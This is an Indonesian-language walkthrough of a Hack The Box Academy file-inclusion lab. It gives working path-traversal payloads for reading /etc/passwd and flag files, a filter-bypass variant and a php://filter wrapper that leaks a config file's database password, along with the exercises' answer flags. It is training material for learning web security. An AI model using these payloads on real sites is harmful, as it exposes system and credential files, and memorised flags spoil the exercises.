# File Inclusion
- Link modul: https://academy.hackthebox.com/module/details/23

## Local File Inclusion (LFI)
- Jalankan web target terlebih dahulu

- **Question:** Using the file inclusion find the name of a user on the system that starts with "b".
- Vunerability berada di URL `http://ip:port/index.php?language=en.php`


- Selanjutnya kita ganti nilai parameter `language` dengan payload file inclusion untuk membaca file `/etc/passwd`
- Akses URL berikut di browser
```sh
http://ip:port/index.php?language=../../../../etc/passwd
```

- Ditemukan nama user barry pada file `/etc/passwd`

- **Answer**
```sh
barry
```

- **Question:** Submit the contents of the flag.txt file located in the /usr/share/flags directory.
- Akses URL berikut di browser
```sh
http://ip:port/index.php?language=../../../../usr/share/flags/flag.txt
```


- **Answer**
```sh
HTB{n3v3r_tru$t_u$3r_!nput}
```

## Basic Bypasses
- Jalankan web target terlebih dahulu

- **Question:** The above web application employs more than one filter to avoid LFI exploitation. Try to bypass these filters to read /flag.txt
- Akses URL berikut di browser untuk mengecek vulnerability file inclusion pada web target
```sh
http://ip:port/index.php?language=languages//....//....//....//....//etc/passwd
```

- Akses URL berikut di browser untuk membaca flag
```sh
http://ip:port/index.php?language=languages//....//....//....//....//flag.txt
```

- **Answer**
```sh
HTB{64$!c_f!lt3r$_w0nt_$t0p_lf!}
```

## PHP Filters
- Jalankan web target terlebih dahulu

- **Question:**  Fuzz the web application for other php scripts, and then read one of the configuration files and submit the database password as the answer
- Pada task ini kita akan menggunakan wordlists dari seclists. Wordlists ini secara default belum tersedia di kali linux, jadi anda perlu menginstalasi terlebih dahulu dengan perintah sebagai berikut
```sh
sudo apt install seclists
```
- Jalankan tool `ffuf` untuk menemukan halaman yang mengandung script PHP
```sh
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://94.237.59.180:45986/FUZZ -e .php -c -ic
```

- Ditemukan script `configure.php` pada hasil fuzzing diatas

- Akses URL sebagai berikut pada browser untuk membuka isi file tersebut
```sh
http://ip:port/index.php?language=php://filter/read=convert.base64-encode/resource=configure
```

- Terdapat code base64 pada halaman diatas, tekan `Ctrl+U` agar kita bisa mengcopy code base64 tersebut secara full

- Decode code base64 diatas lewat terminal
```sh
echo 'code base64' | base64 -d
```

- **Answer**
```sh
HTB{n3v3r_$t0r3_pl4!nt3xt_cr3d$}
```